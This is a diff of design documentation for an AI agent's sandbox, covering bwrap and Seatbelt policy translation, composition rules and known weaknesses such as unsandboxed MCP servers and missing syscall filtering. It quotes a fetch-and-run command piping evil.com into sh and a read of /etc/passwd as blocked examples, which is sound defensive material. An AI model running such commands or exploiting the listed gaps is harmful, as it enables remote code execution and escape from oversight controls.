@@ -157,35 +157,11 @@ For bash commands, the policy is translated into kernel-enforced restrictions:
 | PID isolation | N/A | `--unshare-pid` (visibility only) |
 | Kill on exit | N/A | `--die-with-parent` |
 
-```
-LLM says: bash {"command": "curl evil.com | sh"}
+Example: `curl evil.com | sh` → policy translates to `bwrap --unshare-net ... bash -c 'curl evil.com | sh'` → kernel blocks network → curl fails.
 
-PolicySandbox.check("bash", input):
-  1. Policy for bash: network: Deny, file_read: RestrictTo([cwd]),
-     file_write: RestrictTo([cwd, /tmp])
-  2. Translate to bwrap command:
-     bwrap --ro-bind /usr /usr --ro-bind /bin /bin --ro-bind /etc /etc ...
-       --ro-bind '/workspace' '/workspace'
-       --bind '/workspace' '/workspace' --tmpfs /tmp
-       --dev /dev --proc /proc
-       --unshare-net --die-with-parent
-       bash -c 'curl evil.com | sh'
-  3. -> Allow { input: { "command": "<bwrap-wrapped command>" } }
-  4. Kernel blocks the network call -> curl fails
-```
+**System dirs always mounted:** `/usr`, `/bin`, `/sbin`, `/lib`, `/lib64`, `/etc` are read-only mounted even when `file_read` is restricted (bash needs them). Protection is against reading *user data*, not system files.
 
-**Why essential system dirs are always mounted:** When `file_read` is
-restricted, the bwrap builder still mounts `/usr`, `/bin`, `/sbin`, `/lib`,
-`/lib64`, and `/etc` read-only. Without these, bash cannot function — it
-needs shared libraries, coreutils, and system config (DNS resolution, etc.).
-This means a sandboxed bash command can always read system files like
-`/etc/hostname` or `/usr/bin/python`. The protection is against reading
-*user data* outside the project directory.
-
-**Why /tmp is isolated:** When `/tmp` is in the writable paths, the sandbox
-uses `--tmpfs /tmp` instead of `--bind /tmp /tmp`. This gives each sandboxed
-command its own empty `/tmp`, preventing cross-command communication via
-shared temp files and access to other processes' temp data.
+**Isolated /tmp:** `--tmpfs /tmp` gives each command its own empty `/tmp`, preventing cross-command temp file communication.
 
 ---
 
@@ -302,42 +278,16 @@ cargo run -- --dangerous-no-sandbox
 
 ---
 
-## How Composition Works
+## Composition Rules
 
-```
-CompositeSandbox([PolicySandbox])
-
-Tool call: read_file {"file_path": "/etc/passwd"}
-  |
-  v
-PolicySandbox.check("read_file", input)
-  -> Policy: file_read: RestrictTo(["/workspace"])
-  -> /etc/passwd is outside /workspace
-  -> Deny { reason: "sandbox policy denies file read..." }
-  |
-  v
-Agent receives: ToolOutput::error("Denied by sandbox: ...")
-
-Tool call: bash {"command": "ls"}
-  |
-  v
-PolicySandbox.check("bash", input)
-  -> Policy: network: Deny, file_write: RestrictTo([cwd, /tmp])
-  -> Translate to bwrap command
-  -> Allow { input: {"command": "bwrap ... bash -c 'ls'"} }
-  |
-  v
-BashTool runs: bwrap ... bash -c 'ls'
-```
-
-### Pipeline rules
+`CompositeSandbox` chains sandboxes in sequence:
 
 | Event | Behavior |
 |-------|----------|
 | `Deny` | Stop immediately, return denial |
 | `Redirect` | Stop immediately, return redirect |
 | `Allow { input }` | Pass (possibly rewritten) input to next sandbox |
-| All sandboxes allow | Return final Allow with accumulated rewrites |
+| All allow | Return final Allow with accumulated rewrites |
 | `after()` | All sandboxes run in order, each can mutate output |
 
 ---
@@ -398,59 +348,12 @@ flag. Cannot be set from config.
 
 ## Known Limitations
 
-### `process_exec: Deny` does not prevent process execution
-
-`--unshare-pid` (bwrap) creates a new PID namespace that hides host
-processes, but the sandboxed process can still call `fork()` and `execve()`
-freely. True process execution prevention requires seccomp-bpf filters
-blocking `execve`/`execveat` syscalls. This is non-trivial because bash
-itself needs to exec — the filter would need to allow the initial bash
-invocation but block subsequent exec calls.
-
-### Essential system directories are always readable
-
-When `file_read` is restricted, bwrap still mounts `/usr`, `/bin`, `/sbin`,
-`/lib`, `/lib64`, and `/etc` read-only. Seatbelt similarly whitelists
-`/usr`, `/bin`, `/sbin`, `/Library`, and `/System`. These are required for
-bash to function (shared libraries, coreutils, DNS resolution). This means:
-
-- `/etc/passwd`, `/etc/hostname`, etc. are always readable
-- System-installed tools in `/usr/bin` are always available
-- The sandbox protects against reading *user data* outside the project, not
-  system configuration files
-
-### MCP server processes are not sandboxed
-
-Application-level enforcement only covers the sandbox `check()` gate. MCP
-servers run as external processes with full host access. The sandbox controls
-whether the *agent* can call an MCP tool, but once invoked, the server
-process can read/write any file and make any network call.
-
-Mitigation: Run MCP servers in their own bwrap namespace at spawn time
-(future enhancement).
-
-### macOS Seatbelt is deprecated
-
-`sandbox-exec` is marked as deprecated by Apple but still works on macOS 15+
-(Sequoia). There is no replacement for CLI-level sandboxing on macOS — App
-Sandbox requires entitlements and code signing. It's used in production by
-Homebrew, Nix, and other tools. Kernel-level enforcement is solid while it
-lasts.
-
-### No syscall filtering
-
-Without seccomp-bpf, a sandboxed bash command can still make arbitrary
-syscalls: mount filesystems, use `ptrace`, interact with devices. Bwrap's
-namespace isolation helps but is not a complete jail. For defense in depth,
-consider running Dyson itself inside a container.
-
-### Path sanitization for Seatbelt
-
-Paths containing `"` or `\` are rejected when building Seatbelt
-S-expression profiles to prevent syntax injection. If your working directory
-or configured paths contain these characters, the sandbox will log a warning
-and exclude those paths from the profile (effectively denying access to
-them).
+- **`process_exec: Deny` is weak** — `--unshare-pid` hides host PIDs but doesn't block `fork`/`execve`. True prevention needs seccomp-bpf.
+- **System dirs always readable** — `/etc`, `/usr`, `/bin` are mounted for bash to function. Protects user data, not system files.
+- **MCP servers not sandboxed** — they run as external processes with full host access. The sandbox only gates whether the agent can *invoke* them.
+- **macOS Seatbelt deprecated** — still works on macOS 15+, no replacement for CLI sandboxing. Used by Homebrew, Nix, etc.
+- **No syscall filtering** — without seccomp-bpf, arbitrary syscalls are possible. Run Dyson in a container for defense in depth.
+- **Seatbelt path sanitization** — paths with `"` or `\` are rejected to prevent S-expression injection.
 
 ---
 
@@ -476,16 +379,6 @@ improvements (in priority order):
 5. **Bash command allow-listing** — Rather than just capability restrictions,
    an allow-list of permitted command patterns would catch a broader class of
    attacks.
-
----
-
-## Future Sandbox Implementations
-
-| Sandbox | `check()` behavior | `after()` behavior |
-|---------|-------------------|-------------------|
-| `S3Sandbox` | Redirect file read/write to S3 | None |
-| `AuditSandbox` | Allow everything | Log all calls to a file |
-| `RateLimitSandbox` | Deny after N calls per minute | None |
 
 ---
 
